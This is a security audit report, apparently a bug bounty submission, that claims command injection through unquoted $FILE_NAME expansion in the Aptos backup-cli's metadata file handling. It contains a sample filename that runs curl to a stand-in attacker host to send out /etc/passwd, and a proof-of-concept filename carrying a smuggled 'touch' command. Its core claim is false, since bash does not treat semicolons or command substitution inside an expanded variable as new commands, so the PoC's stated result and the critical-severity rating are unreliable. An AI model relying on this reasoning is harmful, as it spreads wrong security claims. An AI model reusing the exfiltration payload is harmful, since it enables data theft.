# Audit Report

## Title
Command Injection via Unvalidated Filenames in Backup Metadata File Handler

## Summary
The `backup_metadata_file()` function in the CommandAdapter storage backend accepts unvalidated file handles from external storage and uses them in bash commands without proper sanitization. While the codebase uses `ShellSafeName` to validate filenames it creates, file handles returned by `list_metadata_files()` bypass this validation. An attacker with write access to the backup storage can inject malicious filenames containing shell metacharacters, leading to command injection and potential remote code execution on validator nodes.

## Finding Description

The vulnerability exists in the `backup_metadata_file()` method: [1](#0-0) 

This function extracts a filename from the `file_handle` parameter (which is just a `&str` with no validation) and passes it directly to a bash command via environment variable. The file handle originates from the output of `list_metadata_files()`, which reads filenames from external backup storage. [2](#0-1) 

The sample configurations demonstrate that environment variables are used unquoted in bash commands: [3](#0-2) 

The bash command is constructed with environment variables but uses them without quoting: [4](#0-3) 

**Attack Path:**

1. Attacker gains write access to backup storage (S3/GCS/Azure) through misconfigured permissions or compromised credentials
2. Attacker uploads a file with a malicious name to the `metadata/` folder, e.g., `test.meta; curl attacker.com/exfil?data=$(cat /etc/passwd); #.meta`
3. When backup compaction runs, `list_metadata_files()` returns this malicious filename
4. `backup_metadata_file()` is called with this handle (expired files are moved to backup folder)
5. The filename is extracted and passed as `$FILE_NAME` environment variable
6. The bash command uses `$FILE_NAME` unquoted, causing shell interpretation of metacharacters
7. Injected commands execute with the privileges of the backup process [5](#0-4) 

**Why Validation is Missing:**

The codebase correctly uses `ShellSafeName` for filenames it creates, which enforces strict validation: [6](#0-5) 

However, `backup_metadata_file()` accepts a raw `FileHandleRef` without requiring `ShellSafeName`, creating an inconsistency in the security boundary.

## Impact Explanation

**Severity: High to Critical**

This vulnerability enables **Remote Code Execution (RCE)** on validator nodes running the backup CLI tool, which qualifies as **Critical Severity** (up to $1,000,000) per the Aptos bug bounty program.

While command injection is clear, the specific glob pattern expansion mentioned in the security question is limited:
- **For cloud storage URLs** (S3/GCS/Azure in sample configs): Glob patterns like `*`, `?`, `[]` won't cause file expansion because bash glob expansion only works on local filesystem paths
- **For custom local filesystem commands**: If operators configure commands using local paths, glob expansion would occur
- **For general command injection**: Shell metacharacters like `;`, `|`, `$()`, `&` enable arbitrary command execution regardless of glob expansion

The impact includes:
- Arbitrary command execution on validator infrastructure
- Potential theft of validator keys, node credentials
- Data exfiltration from validator nodes
- Compromise of backup integrity
- Lateral movement within validator infrastructure

## Likelihood Explanation

**Likelihood: Medium**

The attack requires:
- **Prerequisite**: Write access to backup storage (S3/GCS/Azure bucket)
- **Trigger**: Running backup compaction (periodic operation)

While storage write access is typically restricted, several scenarios make this exploitable:
- Misconfigured IAM policies granting overly permissive storage access
- Compromised storage credentials (leaked keys, exposed service accounts)
- Shared backup infrastructure between environments
- Insider threats with infrastructure access
- Storage account takeover through separate vulnerabilities

The backup compaction runs periodically (configured interval), so exploitation is deterministic once malicious files are planted.

## Recommendation

**Immediate Fix**: Validate all file handles against the `ShellSafeName` pattern before use, or quote all variable expansions in bash commands.

**Option 1 - Validate Filenames:**

```rust
async fn backup_metadata_file(&self, file_handle: &FileHandleRef) -> Result<()> {
    // extract the file name from the file_handle
    let name = Path::new(file_handle)
        .file_name()
        .and_then(OsStr::to_str)
        .ok_or_else(|| format_err!("cannot extract filename from {}", file_handle))?;
    
    // NEW: Validate filename against ShellSafeName pattern
    ShellSafeName::from_str(name)
        .map_err(|e| format_err!("Invalid filename in file_handle {}: {}", file_handle, e))?;
    
    let child = self
        .cmd(
            self.config
                .commands
                .backup_metadata_file
                .as_ref()
                .expect("metadata backup command not defined !"),
            vec![EnvVar::file_name(name)],
        )
        .spawn()?;
    child.join().await?;
    Ok(())
}
```

**Option 2 - Quote Variables in Sample Configs:**

Update all sample configurations to use properly quoted variables:
```yaml
backup_metadata_file: |
  aws s3 mv "s3://$BUCKET/$SUB_DIR/metadata/$FILE_NAME" "s3://$BUCKET/$SUB_DIR/metadata_backup/$FILE_NAME" --no-progress
```

**Recommendation**: Implement BOTH fixes for defense in depth.

## Proof of Concept

**Setup:**
1. Configure CommandAdapter with a custom command using local filesystem:
```yaml
commands:
  backup_metadata_file: |
    echo "Moving $FILE_NAME"
    mv /tmp/metadata/$FILE_NAME /tmp/backup/
```

2. Create malicious filename in storage:
```bash
# Attacker uploads file to S3 metadata folder
aws s3 cp /dev/null "s3://bucket/metadata/test.meta; touch /tmp/pwned; #.meta"
```

3. When backup compaction runs:
```rust
// This will execute: mv /tmp/metadata/test.meta; touch /tmp/pwned; #.meta /tmp/backup/
// Which bash interprets as:
//   mv /tmp/metadata/test.meta
//   touch /tmp/pwned           <- INJECTED COMMAND EXECUTES
//   # .meta /tmp/backup/        <- Rest is commented out
```

**Expected Result**: The file `/tmp/pwned` is created, demonstrating arbitrary command execution.

**Notes**

The vulnerability stems from an architectural inconsistency: the codebase correctly validates filenames it creates (`ShellSafeName`) but trusts filenames read from external storage. This violates defense-in-depth principles as external storage should be treated as untrusted input, especially in backup systems that may be shared or have separate access controls from the validator node itself.

The specific glob pattern expansion mentioned in the security question is limited in the provided sample configurations (cloud URLs don't glob expand), but the underlying command injection vulnerability is real and exploitable. Operators using custom configurations with local filesystem commands would be vulnerable to both command injection and glob expansion attacks.

### Citations

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L126-138)
```rust
    async fn list_metadata_files(&self) -> Result<Vec<FileHandle>> {
        let child = self
            .cmd(&self.config.commands.list_metadata_files, vec![])
            .spawn()?;

        let mut buf = FileHandle::new();
        child
            .into_data_source()
            .read_to_string(&mut buf)
            .await
            .err_notes((file!(), line!(), &buf))?;
        Ok(buf.lines().map(str::to_string).collect())
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L142-160)
```rust
    async fn backup_metadata_file(&self, file_handle: &FileHandleRef) -> Result<()> {
        // extract the file name from the file_handle
        let name = Path::new(file_handle)
            .file_name()
            .and_then(OsStr::to_str)
            .ok_or_else(|| format_err!("cannot extract filename from {}", file_handle))?;
        let child = self
            .cmd(
                self.config
                    .commands
                    .backup_metadata_file
                    .as_ref()
                    .expect("metadata backup command not defined !"),
                vec![EnvVar::file_name(name)],
            )
            .spawn()?;
        child.join().await?;
        Ok(())
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/s3.sample.yaml (L31-33)
```yaml
  backup_metadata_file: |
    # move metadata file to metadata backup folder
    aws s3 mv s3://$BUCKET/$SUB_DIR/metadata/$FILE_NAME s3://$BUCKET/$SUB_DIR/metadata_backup/$FILE_NAME --no-progress
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L68-79)
```rust
        let mut cmd = tokio::process::Command::new("bash");
        cmd.args(["-c", &command.cmd_str]);
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for v in command
            .config_env_vars
            .iter()
            .chain(command.param_env_vars.iter())
        {
            cmd.env(&v.key, &v.value);
        }
```

**File:** storage/backup/backup-cli/src/coordinators/backup.rs (L454-467)
```rust
        for file in to_move {
            info!(file = file, "Backup metadata file.");
            self.storage
                .backup_metadata_file(&file)
                .await
                .map_err(|err| {
                    error!(
                        file = file,
                        error = %err,
                        "Backup metadata file failed, ignoring.",
                    )
                })
                .ok();
        }
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L46-58)
```rust
/// Specifically, names follow the pattern "\A[a-zA-Z0-9][a-zA-Z0-9._-]{2,126}\z"
#[cfg_attr(test, derive(Hash, Eq, PartialEq))]
#[derive(Debug)]
pub struct ShellSafeName(String);

impl ShellSafeName {
    const PATTERN: &'static str = r"\A[a-zA-Z0-9][a-zA-Z0-9._-]{2,126}\z";

    fn sanitize(name: &str) -> Result<()> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(ShellSafeName::PATTERN).unwrap());
        ensure!(RE.is_match(name), "Illegal name: {}", name,);
        Ok(())
    }
```
